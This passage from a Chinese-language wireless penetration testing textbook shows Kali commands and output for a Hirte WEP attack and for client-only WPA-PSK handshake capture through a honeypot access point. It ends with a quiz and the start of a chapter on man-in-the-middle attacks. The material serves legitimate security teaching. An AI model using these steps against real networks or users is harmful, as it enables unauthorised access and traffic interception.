    ``` root@kali:~# airbase-ng -c 3 -a E8:94:F6:62:1E:8E -e "Wireless Lab" -L -W
    1 mon0 ```

    - 2. 在独立窗口中启动airodump-ng，捕获**Wireless Lab蜜罐**的数据包：

    ``` root@kali:~# airodump-ng -c 3 --bssid 80:1F:02:8F:34:D5 --write Hirte mon0
    ```

    - 3. 现在airodump-ng会开始监控该网络，并将捕获的数据包存储到Hirte-01.cap文件中：

    ``` CH 3 ][ Elapsed: 0 s ][ 2014-11-08 16:54 ][ fixed channel mon0: -1 ```

    | BSSID | PWR | RXQ | Beacons | #Data, | #/s | CH | MI | INC | CIPHER | AUTH |
    ESSID |

    |--------------------|-----|-----|---------|--------|-----|----|----|-----|--------|------|-------|

    | 80:1F:02:8F:34:D5 | 0 | 100 | 32 | 0 | 0 | 3 | 54 | WEP | WEP | W |


    | | BSSID | STATION | PWR | Rate | Lost | Frames | Probe |

    |-------|---------|-----|------|------|--------|-------|

    | | | | | | | | |


    - 4. 一旦漫游客户端连接到我们的蜜罐接入点，**airbase-ng**会自动启动Hirte攻击：

    ``` root@kali:~# airbase-ng -c 3 -e "Wireless Lab" -W 1 -N mon0 16:52:48 Created
    tap interface at0 16:52:48 Trying to set MTU on at0 to 1500 16:52:48 Access Point
    with BSSID 80:1F:02:8F:34:D5 started. Error: Got channel -1, expected a value
    > 0. 16:53:31 Client 00:EE:BD:B3:62:DE associated (WEP) to ESSID: "Wireless Lab"
    16:55:03 Client 00:EE:BD:B3:62:DE associated (WEP) to ESSID: "Wireless Lab" 16:55:07
    Starting Hirte attack against 00:EE:BD:B3:62:DE at 100 pps. ```

    - 5. 我们按照拿铁攻击的步骤启动aircrack-ng，最终即可破解出密钥。我们针对一台与授权网络隔离的WEP客户端实施了Hirte攻击，破解密钥的方式与拿铁攻击完全一致。我们建议在客户端上设置不同的WEP密钥，多次尝试该实验以熟练掌握操作。你可能会注意到，很多时候需要重新连接客户端才能使攻击生效。


    ## 无接入点的WPA个人版破解

    在第4章中，我们了解了如何使用aircrack-ng破解WPA/WPA2 PSK。其基本思路是捕获WPA四次握手包，然后发起字典攻击。

    问题在于：仅使用客户端、无需接入点的情况下，是否能够破解WPA个人版？

    ![](img/f62f3d8a0c2560e2bb8d8daaee6b9939_112_0.png)

    要破解WPA，我们需要从四次握手中获取以下四个参数：认证方随机数（Authenticator Nonce）、请求方随机数（Supplicant Nonce）、认证方MAC地址（Authenticator
    MAC）、请求方MAC地址（Supplicant MAC）。

    现在有趣的是，我们无需获取四次握手中的全部四个数据包，就能提取这些信息。我们可以通过四个数据包获取这些信息：第1和第2个包，或者仅第2和第3个包即可。

    为了破解WPA-PSK，我们将搭建一个WPA-PSK蜜罐，当客户端连接到我们时，只会传输消息1和消息2。由于我们不知道密码短语，因此无法发送消息3。不过，消息1和消息2包含了启动密钥破解流程所需的全部信息：

    ![](img/f62f3d8a0c2560e2bb8d8daaee6b9939_113_0.png)

    开始实操吧！

    - 1. 我们将搭建ESSID为**Wireless Lab**的WPA-PSK蜜罐。`-z 2`参数会创建使用TKIP加密的WPA-PSK接入点：

    ``` root@kali:~# airbase-ng -c 3 -e "Wireless Lab" -W 1 -z 2 mon0 16:56:44 Created
    tap interface at0 16:56:44 Trying to set MTU on at0 to 1500 16:56:44 Access Point
    with BSSID 80:1F:02:8F:34:D5 started. Error: Got channel -1, expected a value
    > 0. ```

    - 2. 我们同样启动**airodump-ng**来捕获该网络的数据包：

    ``` root@kali:~# airodump-ng -c 3 --bssid 80:1F:02:8F:34:D5 --write AP-less-WPA-cracking
    mon0 ```

    - 3. 现在当我们的漫游客户端连接到该接入点时，会启动握手流程，但如前所述，在消息2之后握手会失败；不过，破解握手所需的全部数据已经被捕获。

    - 4. 我们将airdump-ng的捕获文件与之前的字典文件一起交给aircrack-ng处理，最终即可像之前一样破解出密码短语。


    ## 测验——攻击客户端

    Q1. 拿铁攻击可以恢复哪种加密密钥？

    - 1. 无

    - 2. WEP

    - 3. WPA

    - 4. WPA2

    Q2. 蜜罐接入点通常会使用哪种配置？

    - 1. 无加密，开放认证

    - 2. 无加密，共享认证

    - 3. WEP加密，开放认证

    - 4. 以上都不是

    Q3. 以下哪项属于拒绝服务（DoS）攻击？

    - 1. 错误关联攻击

    - 2. 反认证攻击

    - 3. 解关联攻击

    - 4. 2和3都是

    Q4. 拿铁攻击需要满足什么条件？

    - 1. 无线客户端处于接入点的无线电覆盖范围内

    - 2. 客户端中缓存并存储了WEP密钥

    - 3. 使用至少128位加密的WEP加密

    - 4. 1和3都是


    ## 本章总结

    在本章中，我们了解到甚至无线客户端也会遭受攻击。这些攻击包括：蜜罐及其他错误关联攻击、用于从无线客户端获取密钥的拿铁攻击、造成拒绝服务的反认证与解关联攻击、用于从漫游客户端获取WEP密钥的Hirte攻击，以及最后一种仅需客户端即可破解WPA个人版密码短语的攻击。


    ## 第7章：高级无线攻击

    作为渗透测试人员，了解黑客可以实施的高级攻击是非常重要的，即便你在渗透测试过程中可能不会检查或演示这些攻击。本章将重点展示黑客如何以无线接入为起点实施高级攻击。在本章中，我们将学习如何利用目前所学知识实施高级攻击。我们将主要聚焦于**中间人攻击（MITM）**，该攻击需要一定的技能和实践才能成功实施。完成中间人攻击后，我们将以此为基础，实施更复杂的攻击，例如窃听和会话劫持。在本章中，我们将涵盖以下主题：

    - 中间人攻击

    - 基于MITM的无线窃听

    - 基于MITM的会话劫持


    ## 中间人攻击

    中间人攻击是WLAN系统中最具危害性的攻击之一。实施该攻击有多种配置方式，我们将使用最常见的一种：攻击者通过有线局域网连接到互联网，并在自己的客户端网卡上创建一个伪造接入点。该接入点会广播与周边本地热点相似的SSID。用户可能会意外连接到该伪造接入点（或者根据我们之前章节讨论过的信号强度优先理论被强制连接），并且会继续认为自己连接的是合法接入点。此时，攻击者就可以通过自己在有线接口和无线接口之间搭建的网桥，透明转发用户的所有互联网流量。

    '
